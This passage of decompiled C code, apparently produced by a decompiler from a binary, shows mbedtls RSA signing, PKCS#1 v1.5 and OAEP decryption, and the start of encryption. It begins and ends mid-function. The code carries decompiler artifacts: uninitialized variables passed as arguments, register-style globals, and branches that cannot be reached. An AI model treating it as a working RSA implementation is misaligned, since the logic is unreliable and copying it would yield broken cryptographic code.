                v14 = mbedtls_md_get_size(v11) % 256;
                v5 = 2 * v14;
                g4 = v5;
                v22 = v5 + 2;
                g237 = v25 == v22;
                if (v25 >= v22) {
                    // 0x80506ea
                    v20 = (int32_t)a8;
                    memset(a8, 0, v25);
                    v8 = &v16;
                    g1 = a3;
                    ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v8, v14);
                    v21 = g1;
                    if (v21 != 0) {
                        // 0x8050730
                        g1 = v21 - 0x4480;
                        // branch -> 0x8050696
                        // 0x8050696
                        g3 = v1;
                        g5 = v2;
                        return;
                    }
                    // 0x8050752
                    v23 = g3 + 8;
                    v12 = mbedtls_mpi_bitlen(v23, v8);
                    v6 = v20 - 2 + v25 - v5;
                    *(char *)v6 = 1;
                    v4 = v6 + 1;
                    memcpy((char *)v4, (char *)&v16, v14);
                    v9 = &v19;
                    g4 = v9;
                    v7 = v4 + v14;
                    mbedtls_md_init(&v19);
                    g6 = v11;
                    g1 = v9;
                    mbedtls_md_setup(&v19, v11, 0);
                    mbedtls_md_starts(&v19);
                    mbedtls_md_update(&v19, v7, 8);
                    mbedtls_md_update(&v19, a7, v13);
                    mbedtls_md_update(&v19, v8, v14);
                    mbedtls_md_finish(&v19, v7);
                    g4 = v7;
                    g6 = v25 - 1 - v14 + (int32_t)((v12 + 7) % 8 == 0);
                    g1 = (int32_t)((v12 + 7) % 8 == 0) + v20;
                    mgf_mask(v14, &v19, v14, v18, v17);
                    g1 = v9;
                    mbedtls_md_free((char *)&v19);
                    v15 = ((8 * v25 | 1) - mbedtls_mpi_bitlen(v23, v9)) % 32;
                    v24 = 255;
                    if (v15 != 0) {
                        // if_8050894_0_true
                        v24 = 255 >> v15;
                        // branch -> after_if_8050894_0
                    }
                    // after_if_8050894_0
                    *a8 = (char)((int32_t)*a8 & v24);
                    *(char *)(v4 + 2 * v14) = -68;
                    if (g7 == 0) {
                        // 0x80508a9
                        v26 = v20;
                        g1 = mbedtls_rsa_public(g3, v26, v26);
                        // branch -> 0x8050696
                    } else {
                        // 0x80508be
                        g1 = mbedtls_rsa_private(g3, g5, a3, v20, v20);
                        // branch -> 0x8050696
                    }
                    // 0x8050696
                    g3 = v1;
                    g5 = v2;
                    return;
                }
            }
        }
    }
    // 0x8050691
    g1 = -0x4080;
    // branch -> 0x8050696
    // 0x8050696
    g3 = v1;
    g5 = v2;
}

// Address range: 0x80508f0 - 0x80509af
void mbedtls_rsa_pkcs1_sign(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g3; // 0x80508fc
    g4 = a5;
    int32_t v2 = g7; // 0x8050902
    g3 = a6;
    int32_t v3 = g5; // 0x805090e
    int32_t v4 = *(int32_t *)(a1 + 164); // 0x8050920
    int32_t v5 = a1; // 0x8050996
    int32_t v6 = v4; // 0x8050960
    int32_t v7;
    int32_t v8;
    if (v4 == 0) {
        // 0x805092a
        g5 = v3;
        g7 = v2;
        g3 = v1;
        g6 = a2;
        v5 = mbedtls_rsa_rsassa_pkcs1_v15_sign((char *)v8, (char *)v7, a1, a2, a3, (char)a4, a5, (char *)a6);
        v6 = g6;
        // branch -> 0x8050960
    }
    // 0x8050960
    if (v6 != 1) {
        // 0x8050965
        g3 = v1;
        g1 = -0x4100;
        g5 = v3;
        return;
    }
    // 0x8050978
    g5 = v3;
    g7 = v2;
    int32_t v9 = g3; // 0x8050987
    g3 = v1;
    mbedtls_rsa_rsassa_pss_sign((char *)v8, (char *)v7, v5, a2, a3, a4, g4, (char *)v9);
}

// Address range: 0x80509b0 - 0x8050bff
int32_t mbedtls_rsa_rsaes_pkcs1_v15_decrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, uint32_t a8) {
    int32_t v1 = g3; // 0x80509bc
    int32_t v2 = (int32_t)a1;
    int32_t v3 = g7; // 0x80509c2
    g3 = a6;
    int32_t v4 = g5; // 0x80509c8
    int32_t v5; // 0x8050a75
    int32_t v6; // 0x8050b55
    int32_t v7; // 0x8050a7b
    int32_t v8; // 0x8050b75
    int32_t v9; // 0x80509ee_0
    uint32_t v10; // 0x8050a24_0
    uint32_t v11; // 0x8050b1e_0
    int32_t v12; // 0x8050bab_0
    int32_t v13; // 0x8050bd0_0
    int32_t v14; // ebx
    int32_t v15; // edx
    int32_t v16;
    int32_t v17;
    int32_t v18;
    int32_t v19;
    int32_t v20;
    int32_t v21;
    int32_t v22;
    int32_t v23; // 0x8050a70
    int32_t v24; // 0x8050aa4
    int32_t result; // 0x8050acb
    int32_t v25; // 0x8050b24
    int32_t v26; // 0x8050ba4
    int32_t v27; // 0x8050bbc
    int32_t v28; // 0x8050bbc55
    int32_t v29; // 0x8050bbc56
    int32_t v30;
    int32_t v31;
    int32_t v32; // 0x8050a75
    unsigned char v33; // 0x8050aa4
    int32_t v34; // 0x8050b55
    int32_t v35; // 0x8050b64
    unsigned char v36; // 0x8050ba4
    int32_t v37; // 0x80509d7
    int32_t v38; // 0x8050a6d
    int32_t v39; // 0x8050a91
    int32_t v40; // 0x8050b43
    int32_t v41; // 0x8050b5a
    int32_t v42; // 0x8050b91
    int32_t v43; // 0x8050bbe
    int32_t v44; // 0x8050bbe
    int32_t v45; // 0x8050bbe58
    int32_t v46; // 0x8050bbe59
    int32_t v47; // 0x80509d4
    int32_t v48; // 0x8050a87
    int32_t v49; // 0x8050b8d
    uint32_t v50; // 0x8050b26
    int32_t v51; // 0x8050b50
    if (a4 != 1) {
        // 0x80509d4
        v47 = *(int32_t *)(v2 + 4);
        g7 = v47;
        v37 = v47 - 16;
        g4 = v37;
        if (v37 > 1008) {
            // 0x8050ac6
            result = -0x4080;
            // branch -> 0x8050acb
        } else {
            // 0x80509e6
            v9 = &v19;
            g5 = v9;
            if (a4 == 0) {
                // 0x80509ee
                v40 = mbedtls_rsa_public(v2, a6, v9);
                // branch -> 0x8050a12
            } else {
                // 0x8050ae0
                v22 = (int32_t)a2;
                g4 = v22;
                v40 = mbedtls_rsa_private(v2, v22, a3, a6, v9);
                // branch -> 0x8050a12
            }
            // 0x8050a12
            v14 = v40;
            if (v40 == 0) {
                // 0x8050a1a
                v10 = 0x1000000 * v19 / 0x1000000;
                v11 = 0x1000000 * v18 / 0x1000000;
                v25 = g7;
                v50 = v25 - 3;
                if (a4 == 1) {
                    // 0x8050b17
                    if (v25 == 3) {
                        // 0x8050bd0
                        v13 = &v16;
                        v15 = v13;
                        v45 = 3;
                        v28 = v13;
                        v26 = &v17;
                        // branch -> 0x8050b94
                    } else {
                        // 0x8050b35
                        v31 = g5;
                        v34 = 0;
                        v51 = (int32_t)*(char *)(v34 + 2 + v31);
                        v6 = v34 + 1;
                        v41 = -v51;
                        v35 = ((v51 | v41) / 128 % 2 | v41 & -256) ^ 1;
                        v8 = (v35 | -v35) / 128 % 2 ^ 1;
                        // branch -> 0x8050b50
                        while (v6 < v50) {
                            // 0x8050b50
                            v34 = v6;
                            v51 = (int32_t)*(char *)(v34 + 2 + v31);
                            v6 = v34 + 1;
                            v41 = -v51;
                            v35 |= ((v51 | v41) / 128 % 2 | v41 & -256) ^ 1;
                            v8 += ((v35 | -v35) / 128 % 2 ^ 1);
                            // continue -> 0x8050b50
                        }
                        // 0x8050b7f
                        v14 = 0;
                        v49 = v8 + 2 + v31;
                        v42 = v49 + 1;
                        v15 = v42;
                        v45 = v25;
                        v28 = v42;
                        v26 = v49;
                        // branch -> 0x8050b94
                    }
                    // 0x8050b94
                    v36 = *(char *)v26;
                    v21 = (int32_t)v36 | v10 % 256 | v11 % 256 ^ 2;
                    v44 = v45;
                    v27 = v28;
                    // branch -> 0x8050aa6
                } else {
                    // 0x8050a30
                    if (v25 == 3) {
                        // 0x8050bab
                        v12 = &v16;
                        v15 = v12;
                        v46 = 3;
                        v29 = v12;
                        v24 = &v17;
                        // branch -> 0x8050a94
                    } else {
                        // 0x8050a4e
                        v30 = g5;
                        v23 = 0;
                        v32 = 0;
                        v38 = *(char *)(v32 + 2 + v30) != -1;
                        v5 = v32 + 1;
                        v7 = (v38 | v23 % 256) == 0;
                        // branch -> 0x8050a68
                        while (v5 < v50) {
                            // 0x8050a68
                            v23 |= v38;
                            v32 = v5;
                            v38 = *(char *)(v32 + 2 + v30) != -1;
                            v5 = v32 + 1;
                            v7 += (int32_t)((v38 | v23 % 256) == 0);
                            // continue -> 0x8050a68
                        }
                        // 0x8050a81
                        v48 = v7 + 2 + v30;
                        v14 = 0;
                        v39 = v48 + 1;
                        v15 = v39;
                        v46 = v25;
                        v29 = v39;
                        v24 = v48;
                        // branch -> 0x8050a94
                    }
                    // 0x8050a94
                    v33 = *(char *)v24;
                    v21 = (int32_t)v33 | v10 % 256 | v11 % 256 ^ 1;
                    v44 = v46;
                    v27 = v29;
                    // branch -> 0x8050aa6
                }
                // 0x8050aa6
                g4 = v21;
                if (v21 % 256 != 0) {
                    // 0x8050aae
                    // branch -> 0x8050acb
                    // 0x8050acb
                    g7 = v3;
                    g3 = v1;
                    g5 = v4;
                    g2 = v20;
                    return -0x4100;
                }
                // 0x8050bbc
                v43 = g5 - v27 + v44;
                if (v43 > a8) {
                    // 0x8050bc6
                    result = -0x4400;
                    // branch -> 0x8050acb
                } else {
                    // 0x8050bde
                    *a5 = v43;
                    memcpy((char *)a7, (char *)v15, v43);
                    result = v14;
                    // branch -> 0x8050acb
                }
                // 0x8050acb
                g7 = v3;
                g3 = v1;
                g5 = v4;
                g2 = v20;
                return result;
            }
            result = v40;
        }
        // 0x8050acb
        g7 = v3;
        g3 = v1;
        g5 = v4;
        g2 = v20;
        return result;
    }
    // 0x8050ab8
    if (*(int32_t *)(v2 + 164) != 0) {
        // 0x8050ac6
        // branch -> 0x8050acb
        // 0x8050acb
        g7 = v3;
        g3 = v1;
        g5 = v4;
        g2 = v20;
        return -0x4080;
    }
    // 0x80509d4
    v47 = *(int32_t *)(v2 + 4);
    g7 = v47;
    v37 = v47 - 16;
    g4 = v37;
    if (v37 > 1008) {
        // 0x8050ac6
        result = -0x4080;
        // branch -> 0x8050acb
    } else {
        // 0x80509e6
        v9 = &v19;
        g5 = v9;
        if (a4 == 0) {
            // 0x80509ee
            v40 = mbedtls_rsa_public(v2, a6, v9);
            // branch -> 0x8050a12
        } else {
            // 0x8050ae0
            v22 = (int32_t)a2;
            g4 = v22;
            v40 = mbedtls_rsa_private(v2, v22, a3, a6, v9);
            // branch -> 0x8050a12
        }
        // 0x8050a12
        v14 = v40;
        if (v40 == 0) {
            // 0x8050a1a
            v10 = 0x1000000 * v19 / 0x1000000;
            v11 = 0x1000000 * v18 / 0x1000000;
            v25 = g7;
            v50 = v25 - 3;
            if (a4 == 1) {
                // 0x8050b17
                if (v25 == 3) {
                    // 0x8050bd0
                    v13 = &v16;
                    v15 = v13;
                    v45 = 3;
                    v28 = v13;
                    v26 = &v17;
                    // branch -> 0x8050b94
                } else {
                    // 0x8050b35
                    v31 = g5;
                    v34 = 0;
                    v51 = (int32_t)*(char *)(v34 + 2 + v31);
                    v6 = v34 + 1;
                    v41 = -v51;
                    v35 = ((v51 | v41) / 128 % 2 | v41 & -256) ^ 1;
                    v8 = (v35 | -v35) / 128 % 2 ^ 1;
                    // branch -> 0x8050b50
                    while (v6 < v50) {
                        // 0x8050b50
                        v34 = v6;
                        v51 = (int32_t)*(char *)(v34 + 2 + v31);
                        v6 = v34 + 1;
                        v41 = -v51;
                        v35 |= ((v51 | v41) / 128 % 2 | v41 & -256) ^ 1;
                        v8 += ((v35 | -v35) / 128 % 2 ^ 1);
                        // continue -> 0x8050b50
                    }
                    // 0x8050b7f
                    v14 = 0;
                    v49 = v8 + 2 + v31;
                    v42 = v49 + 1;
                    v15 = v42;
                    v45 = v25;
                    v28 = v42;
                    v26 = v49;
                    // branch -> 0x8050b94
                }
                // 0x8050b94
                v36 = *(char *)v26;
                v21 = (int32_t)v36 | v10 % 256 | v11 % 256 ^ 2;
                v44 = v45;
                v27 = v28;
                // branch -> 0x8050aa6
            } else {
                // 0x8050a30
                if (v25 == 3) {
                    // 0x8050bab
                    v12 = &v16;
                    v15 = v12;
                    v46 = 3;
                    v29 = v12;
                    v24 = &v17;
                    // branch -> 0x8050a94
                } else {
                    // 0x8050a4e
                    v30 = g5;
                    v23 = 0;
                    v32 = 0;
                    v38 = *(char *)(v32 + 2 + v30) != -1;
                    v5 = v32 + 1;
                    v7 = (v38 | v23 % 256) == 0;
                    // branch -> 0x8050a68
                    while (v5 < v50) {
                        // 0x8050a68
                        v23 |= v38;
                        v32 = v5;
                        v38 = *(char *)(v32 + 2 + v30) != -1;
                        v5 = v32 + 1;
                        v7 += (int32_t)((v38 | v23 % 256) == 0);
                        // continue -> 0x8050a68
                    }
                    // 0x8050a81
                    v48 = v7 + 2 + v30;
                    v14 = 0;
                    v39 = v48 + 1;
                    v15 = v39;
                    v46 = v25;
                    v29 = v39;
                    v24 = v48;
                    // branch -> 0x8050a94
                }
                // 0x8050a94
                v33 = *(char *)v24;
                v21 = (int32_t)v33 | v10 % 256 | v11 % 256 ^ 1;
                v44 = v46;
                v27 = v29;
                // branch -> 0x8050aa6
            }
            // 0x8050aa6
            g4 = v21;
            if (v21 % 256 != 0) {
                // 0x8050aae
                // branch -> 0x8050acb
                // 0x8050acb
                g7 = v3;
                g3 = v1;
                g5 = v4;
                g2 = v20;
                return -0x4100;
            }
            // 0x8050bbc
            v43 = g5 - v27 + v44;
            if (v43 > a8) {
                // 0x8050bc6
                result = -0x4400;
                // branch -> 0x8050acb
            } else {
                // 0x8050bde
                *a5 = v43;
                memcpy((char *)a7, (char *)v15, v43);
                result = v14;
                // branch -> 0x8050acb
            }
            // 0x8050acb
            g7 = v3;
            g3 = v1;
            g5 = v4;
            g2 = v20;
            return result;
        }
        result = v40;
    }
    // 0x8050acb
    g7 = v3;
    g3 = v1;
    g5 = v4;
    g2 = v20;
    return result;
}

// Address range: 0x8050c00 - 0x8050edf
int32_t mbedtls_rsa_rsaes_oaep_decrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t * a7, int32_t a8, int32_t a9, uint32_t a10) {
    int32_t v1 = (int32_t)a1;
    g3 = v1;
    int32_t v2; // 0x8050db8
    int32_t v3; // 0x8050e19
    int32_t v4; // 0x8050ea6
    int32_t v5; // 0x8050e9033
    int32_t v6; // 0x8050d7e
    int32_t v7; // 0x8050dec
    int32_t v8; // 0x8050e31
    int32_t v9; // 0x8050e4d
    int32_t v10; // 0x8050c6f_0
    int32_t v11; // 0x8050cae_0
    int32_t v12; // 0x8050cd6_0
    int32_t v13; // 0x8050d34_0
    int32_t v14; // 0x8050c59
    uint32_t v15; // 0x8050ca5
    int32_t v16;
    int32_t v17;
    int32_t v18;
    int32_t v19;
    int32_t v20;
    int32_t v21;
    int32_t v22;
    int32_t v23; // 0x8050d0e
    int32_t result; // 0x8050c2f
    int32_t v24; // 0x8050ea2
    int32_t v25; // 0x8050e16
    int32_t v26; // 0x8050c75
    int32_t v27; // 0x8050db8
    int32_t v28; // 0x8050dbb
    int32_t v29;
    int32_t v30; // 0x8050ddf
    int32_t v31; // 0x8050e4736
    int32_t v32; // 0x8050eab
    int32_t v33; // 0x8050c1d
    int32_t v34; // 0x8050d77
    char v35; // 0x8050db0
    int32_t v36; // 0x8050e4d34
    int32_t v37; // 0x8050d14
    int32_t v38; // 0x8050e1937
    if (a4 != 1) {
        // 0x8050c1d
        v33 = *(int32_t *)(v1 + 4);
        g7 = v33;
        if (v33 >= 1025) {
            // 0x8050c2a
            // branch -> 0x8050c2f
            // 0x8050c2f
            g2 = v21;
            return -0x4080;
        }
        // 0x8050c50
        v14 = mbedtls_md_info_from_type(*(int32_t *)(v1 + 168));
        if (v14 == 0) {
            // 0x8050c2a
            // branch -> 0x8050c2f
            // 0x8050c2f
            g2 = v21;
            return -0x4080;
        }
        // 0x8050c64
        v10 = &v18;
        g5 = v10;
        v26 = g3;
        if (a4 == 0) {
            // 0x8050c6c
            v22 = mbedtls_rsa_public(v26, a8, v10);
            v5 = v19;
            // branch -> 0x8050c93
        } else {
            // 0x8050e68
            v22 = mbedtls_rsa_private(v26, (int32_t)a2, a3, a8, v10);
            v5 = v10;
            // branch -> 0x8050c93
        }
        // 0x8050c93
        g3 = v22;
        result = v22;
        if (v22 == 0) {
            // 0x8050c97
            v15 = mbedtls_md_get_size(v14) % 256;
            v11 = &v20;
            mbedtls_md_init(&v20);
            g6 = v14;
            g1 = v11;
            mbedtls_md_setup(&v20, v14, 0);
            v12 = &v16;
            mbedtls_md(v14, a5, a6, v12);
            g6 = v15;
            v23 = g7 - 1 - v15;
            v37 = v15 + 1 + g5;
            g4 = v37;
            v13 = &v17;
            g1 = v13;
            mgf_mask(v23, &v20, a6, v12, v5);
            g6 = v23;
            g4 = v13;
            g1 = v37;
            mgf_mask(v15, &v20, a6, v12, v5);
            g1 = v11;
            mbedtls_md_free((char *)&v20);
            v34 = v18 % 256;
            v6 = v15 + v13;
            v29 = g7;
            v24 = v34;
            v31 = v6;
            if (v15 != 0) {
                // 0x8050d93
                v27 = 0;
                v35 = *(char *)(v27 + v6);
                v2 = v27 + 1;
                v28 = (int32_t)(*(char *)(g2 - 100 + v27) ^ v35) | v34;
                // branch -> 0x8050db0
                while (v15 > v2) {
                    // 0x8050db0
                    v27 = v2;
                    v35 = *(char *)(v27 + v6);
                    v2 = v27 + 1;
                    v28 |= (int32_t)(*(char *)(g2 - 100 + v27) ^ v35);
                    // continue -> 0x8050db0
                }
                // 0x8050dc1
                v24 = v28;
                v31 = v6 + v15;
                // branch -> 0x8050dd9
            }
            // 0x8050dd9
            v30 = v29 - 2;
            v7 = 2 * v15;
            v36 = 0;
            if (v30 != v7) {
                // 0x8050df8
                v38 = 0;
                v25 = (int32_t)*(char *)(v38 + v31);
                v3 = v38 + 1;
                v8 = (v25 | -v25) / 128 % 2 ^ 1;
                // branch -> 0x8050e0a
                while (v3 < v30 - v7) {
                    // 0x8050e0a
                    v38 = v3;
                    v25 |= (int32_t)*(char *)(v38 + v31);
                    v3 = v38 + 1;
                    v8 += ((v25 | -v25) / 128 % 2 ^ 1);
                    // continue -> 0x8050e0a
                }
                // 0x8050e41
                v36 = v8;
                // branch -> 0x8050e47
            }
            // 0x8050e47
            v9 = v36 + v31;
            if (*(char *)v9 == 1) {
                // 0x8050ea2
                if (v24 % 256 == 0) {
                    // 0x8050ea6
                    v4 = v9 + 1;
                    v32 = v29 + g5 - v4;
                    if (v32 > a10) {
                        // 0x8050eb3
                        result = -0x4400;
                        // branch -> 0x8050c2f
                    } else {
                        // 0x8050ebd
                        *a7 = v32;
                        memcpy((char *)a9, (char *)v4, v32);
                        result = g3;
                        // branch -> 0x8050c2f
                    }
                    // 0x8050c2f
                    g2 = v21;
                    return result;
                }
            }
            // 0x8050e58
            result = -0x4100;
            // branch -> 0x8050c2f
        }
        // 0x8050c2f
        g2 = v21;
        return result;
    }
    // 0x8050c40
    if (*(int32_t *)(v1 + 164) != 1) {
        // 0x8050c2a
        // branch -> 0x8050c2f
        // 0x8050c2f
        g2 = v21;
        return -0x4080;
    }
    // 0x8050c1d
    v33 = *(int32_t *)(v1 + 4);
    g7 = v33;
    if (v33 < 1025) {
        // 0x8050c50
        v14 = mbedtls_md_info_from_type(*(int32_t *)(v1 + 168));
        if (v14 != 0) {
            // 0x8050c64
            v10 = &v18;
            g5 = v10;
            v26 = g3;
            if (a4 == 0) {
                // 0x8050c6c
                v22 = mbedtls_rsa_public(v26, a8, v10);
                v5 = v19;
                // branch -> 0x8050c93
            } else {
                // 0x8050e68
                v22 = mbedtls_rsa_private(v26, (int32_t)a2, a3, a8, v10);
                v5 = v10;
                // branch -> 0x8050c93
            }
            // 0x8050c93
            g3 = v22;
            result = v22;
            if (v22 == 0) {
                // 0x8050c97
                v15 = mbedtls_md_get_size(v14) % 256;
                v11 = &v20;
                mbedtls_md_init(&v20);
                g6 = v14;
                g1 = v11;
                mbedtls_md_setup(&v20, v14, 0);
                v12 = &v16;
                mbedtls_md(v14, a5, a6, v12);
                g6 = v15;
                v23 = g7 - 1 - v15;
                v37 = v15 + 1 + g5;
                g4 = v37;
                v13 = &v17;
                g1 = v13;
                mgf_mask(v23, &v20, a6, v12, v5);
                g6 = v23;
                g4 = v13;
                g1 = v37;
                mgf_mask(v15, &v20, a6, v12, v5);
                g1 = v11;
                mbedtls_md_free((char *)&v20);
                v34 = v18 % 256;
                v6 = v15 + v13;
                v29 = g7;
                v24 = v34;
                v31 = v6;
                if (v15 != 0) {
                    // 0x8050d93
                    v27 = 0;
                    v35 = *(char *)(v27 + v6);
                    v2 = v27 + 1;
                    v28 = (int32_t)(*(char *)(g2 - 100 + v27) ^ v35) | v34;
                    // branch -> 0x8050db0
                    while (v15 > v2) {
                        // 0x8050db0
                        v27 = v2;
                        v35 = *(char *)(v27 + v6);
                        v2 = v27 + 1;
                        v28 |= (int32_t)(*(char *)(g2 - 100 + v27) ^ v35);
                        // continue -> 0x8050db0
                    }
                    // 0x8050dc1
                    v24 = v28;
                    v31 = v6 + v15;
                    // branch -> 0x8050dd9
                }
                // 0x8050dd9
                v30 = v29 - 2;
                v7 = 2 * v15;
                v36 = 0;
                if (v30 != v7) {
                    // 0x8050df8
                    v38 = 0;
                    v25 = (int32_t)*(char *)(v38 + v31);
                    v3 = v38 + 1;
                    v8 = (v25 | -v25) / 128 % 2 ^ 1;
                    // branch -> 0x8050e0a
                    while (v3 < v30 - v7) {
                        // 0x8050e0a
                        v38 = v3;
                        v25 |= (int32_t)*(char *)(v38 + v31);
                        v3 = v38 + 1;
                        v8 += ((v25 | -v25) / 128 % 2 ^ 1);
                        // continue -> 0x8050e0a
                    }
                    // 0x8050e41
                    v36 = v8;
                    // branch -> 0x8050e47
                }
                // 0x8050e47
                v9 = v36 + v31;
                if (*(char *)v9 == 1) {
                    // 0x8050ea2
                    if (v24 % 256 == 0) {
                        // 0x8050ea6
                        v4 = v9 + 1;
                        v32 = v29 + g5 - v4;
                        if (v32 > a10) {
                            // 0x8050eb3
                            result = -0x4400;
                            // branch -> 0x8050c2f
                        } else {
                            // 0x8050ebd
                            *a7 = v32;
                            memcpy((char *)a9, (char *)v4, v32);
                            result = g3;
                            // branch -> 0x8050c2f
                        }
                        // 0x8050c2f
                        g2 = v21;
                        return result;
                    }
                }
                // 0x8050e58
                result = -0x4100;
                // branch -> 0x8050c2f
            }
            // 0x8050c2f
            g2 = v21;
            return result;
        }
    }
    // 0x8050c2a
    // branch -> 0x8050c2f
    // 0x8050c2f
    g2 = v21;
    return -0x4080;
}

// Address range: 0x8050ee0 - 0x8050fbc
int32_t mbedtls_rsa_pkcs1_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12) {
    // 0x8050ee0
    int32_t v1;
    int32_t v2 = v1; // bp-4
    int32_t v3 = g3; // 0x8050eec
    g3 = a6;
    int32_t v4 = g7; // 0x8050ef2
    g7 = a7;
    int32_t v5 = g5; // 0x8050efe
    int32_t v6 = *(int32_t *)(a1 + 164); // 0x8050f01
    g4 = v6;
    g5 = a8;
    int32_t v7 = &v2; // 0x8050f9d
    int32_t v8 = v6; // 0x8050f58
    if (v6 == 0) {
        // 0x8050f1d
        g5 = v5;
        g7 = v4;
        g3 = v3;
        int32_t v9;
        mbedtls_rsa_rsaes_pkcs1_v15_decrypt((char *)v1, (char *)v9, a1, a2, (int32_t *)a3, a4, a5, a6);
        v7 = g2;
        v8 = g4;
        // branch -> 0x8050f58
    }
    // 0x8050f58
    if (v8 != 1) {
        // 0x8050f62
        g3 = *(int32_t *)(v7 - 12);
        g7 = *(int32_t *)(v7 - 8);
        g5 = *(int32_t *)(v7 - 4);
        return -0x4100;
    }
    int32_t result = mbedtls_rsa_rsaes_oaep_decrypt((char *)a1, (char *)a2, a3, a4, a5, a6, (int32_t *)a7, a8, a9, a10); // 0x8050fab
    g3 = *(int32_t *)(g2 - 12);
    g7 = *(int32_t *)(g2 - 8);
    g5 = *(int32_t *)(g2 - 4);
    return result;
}

// Address range: 0x8050fbd - 0x8050fbf
int32_t function_8050fbd(int32_t a1) {
    // 0x8050fbd
    return g7;
}

// Address range: 0x8050fc0 - 0x805114f
int32_t mbedtls_rsa_rsaes_pkcs1_v15_encrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, char * a6, char * a7) {
    // 0x8050fc0
    int32_t v1;
    int32_t v2 = v1; // bp-4
    char * v3 = a1;
    g2 = &v2;
    int32_t v4 = g5; // 0x8050fc3
    int32_t v5 = g7; // 0x8050fc4
    int32_t v6 = g3; // 0x8050fc5
    int32_t v7 = (int32_t)a1;
    g5 = (int32_t)a2;
    int32_t v8 = (int32_t)a7;
    g4 = v8;
    int32_t v9; // 0x8051021
    int32_t v10; // 0x8051092
    int32_t v11; // 0x80510a5
    int32_t v12; // 0x80510a582
    int32_t v13; // 0x80510ac
    int32_t v14; // ecx
    int32_t v15; // edx
    int32_t v16;
    char * v17;
    char * v18;
    int32_t v19; // 0x8051038
    int32_t v20; // 0x80510ae
    int32_t v21; // 0x80510f9
    int32_t v22; // 0x8051133
    uint32_t v23; // 0x805101b
    int32_t v24; // 0x8051063
    int32_t v25; // 0x80510d3
    int32_t v26; // 0x8051133
    int32_t v27; // 0x8051049
    if (a4 == 1) {
        // 0x8051008
        if (*(int32_t *)(v7 + 164) != 0 || a2 == NULL) {
            // 0x8050ffb
            g3 = v6;
            g7 = v5;
            g5 = v4;
            g2 = v1;
            return -0x4080;
        }
        // 0x8051018
        v23 = *(int32_t *)(v7 + 4);
        v9 = a5 + 11;
        g4 = v9;
        if (v23 < v9) {
            // 0x8050ffb
            g3 = v6;
            g7 = v5;
            g5 = v4;
            g2 = v1;
            return -0x4080;
        }
        // 0x8051028
        g4 = v8;
        v15 = -3 - a5 + v23;
        *a7 = 0;
        if (a4 == 0) {
            // 0x8051038
            v19 = g4;
            g7 = v19 + 2;
            *(char *)(v19 + 1) = 2;
            if (v15 == 0) {
                // 0x8051038
                // branch -> 0x8051117
                // 0x8051117
                *(char *)g7 = 0;
                memcpy(v3, a2, a3);
                v22 = g2;
                v26 = *(int32_t *)(v22 - 36);
                g4 = v26;
                *(int32_t *)(v22 + 16) = v26;
                *(int32_t *)(g2 + 12) = g4;
                *(int32_t *)(g2 + 8) = *(int32_t *)(v22 - 32);
                g3 = v6;
                g7 = v5;
                g5 = v4;
                return mbedtls_rsa_public(v2, v16, (int32_t)v3);
            }
            // 0x8051049
            v27 = v15 - 1;
            g237 = v27 == 0;
            g6 = v27;
            v17 = a2;
            // branch -> 0x8051050
          lab_0x8051050:
            // 0x8051050
            g3 = 100;
            v24 = g7;
            // branch -> 0x8051058
          lab_0x8051058:;
            int32_t v28; // 0x805107a
            while (true) {
                int32_t v29 = *(int32_t *)(g2 - 28); // 0x8051058
                g1 = v29;
                ((int32_t (*)(int32_t, int32_t, int32_t))g5)(v29, v24, 1);
                int32_t v30 = g7; // 0x805106c
                if (*(char *)v30 == 0) {
                    int32_t v31 = g3 - 1; // 0x8051071
                    g3 = v31;
                    if (v31 != 0) {
                        // 0x805107a
                        v28 = g1;
                        g237 = v28 == 0;
                        if (v28 != 0) {
                            // break -> 0x805107e
                            break;
                        }
                        v24 = v30;
                        // continue -> 0x8051058
                        continue;
                    } else {
                        v18 = v17;
                        v21 = 1;
                    }
                } else {
                    // 0x80510f0
                    v18 = v17;
                    v21 = g6 & -256 | (int32_t)(g3 == 0);
                    // branch -> 0x80510f5
                }
              lab_0x80510f5_4:
                // 0x80510f5
                g6 = v21;
                int32_t v32 = g1; // 0x80510f5
                int32_t v33 = v32; // 0x805107e
                if (v32 == 0) {
                    // 0x80510f9
                    if (v21 % 256 == 0) {
                        int32_t * v34 = (int32_t *)(g2 - 40); // 0x80510fd_0
                        int32_t v35 = g7 + 1; // 0x8051100
                        g7 = v35;
                        if (*v34 == 0) {
                            // 0x8051117
                            *(char *)v35 = 0;
                            memcpy(v3, v18, a3);
                            v22 = g2;
                            v26 = *(int32_t *)(v22 - 36);
                            g4 = v26;
                            *(int32_t *)(v22 + 16) = v26;
                            *(int32_t *)(g2 + 12) = g4;
                            *(int32_t *)(g2 + 8) = *(int32_t *)(v22 - 32);
                            g3 = v6;
                            g7 = v5;
                            g5 = v4;
                            return mbedtls_rsa_public(v2, v16, (int32_t)v3);
                        }
                        int32_t v36 = *v34 - 1; // 0x8051107
                        g237 = v36 == 0;
                        *v34 = v36;
                        v17 = v18;
                        // branch -> 0x8051050
                        goto lab_0x8051050;
                    } else {
                        v33 = 0;
                    }
                }
                // 0x805107e
                // branch -> 0x8050ffb
                // 0x8050ffb
                g3 = v6;
                g7 = v5;
                g5 = v4;
                g2 = v2;
                return v33 - 0x4480;
            }
            // 0x805107e
            // branch -> 0x8050ffb
            // 0x8050ffb
            g3 = v6;
            g7 = v5;
            g5 = v4;
            g2 = v2;
            return v28 - 0x4480;
        }
        // 0x8051088
        *(char *)(v8 + 1) = 1;
        v10 = v8 + 2;
        v14 = v10;
        v20 = v10;
        if (v15 != 0) {
            // 0x8051099
            *(char *)v10 = -1;
            v12 = 1;
            if (v15 != v12) {
                *(char *)(v12 + 2 + v8) = -1;
                v11 = v12 + 1;
                while (v15 != v11) {
                    // 0x80510a0
                    *(char *)(v11 + 2 + v8) = -1;
                    v11++;
                    // continue -> 0x80510a0
                }
                // 0x80510ac
                v13 = v14 + v11;
                // branch -> 0x80510ae
                // 0x80510ae
                *(char *)v13 = 0;
                memcpy((char *)(v13 + 1), a6, a5);
                g4 = a3;
                v25 = g5;
                v3 = a1;
                g3 = v6;
